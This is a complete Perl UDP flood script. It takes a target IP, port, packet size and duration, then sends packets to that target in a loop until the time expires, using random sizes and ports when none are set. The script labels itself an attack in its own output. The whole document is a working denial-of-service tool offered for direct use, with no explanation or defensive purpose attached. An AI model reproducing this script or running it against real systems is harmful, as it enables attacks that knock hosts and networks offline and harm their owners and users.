#!/usr/bin/perl
use Socket;
use strict;

if ($#ARGV != 3) 
{
    print "USE: perl $0 <ip> <port> <bytes> <time>\n";
    exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Hostname not found: $ip \n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "[!] Started attack!\n\n";
print "[+] Target information: \n";
print "  [i] IP & PORT: $ARGV[0]:$ARGV[1]\n";
print "  [i] Bytes: $ARGV[2]\n";
print "  [i] Time: $ARGV[3]\n\n";

for (;time() <= $endtime;) 
{
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(30000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
}

print "[!] Attack finished!"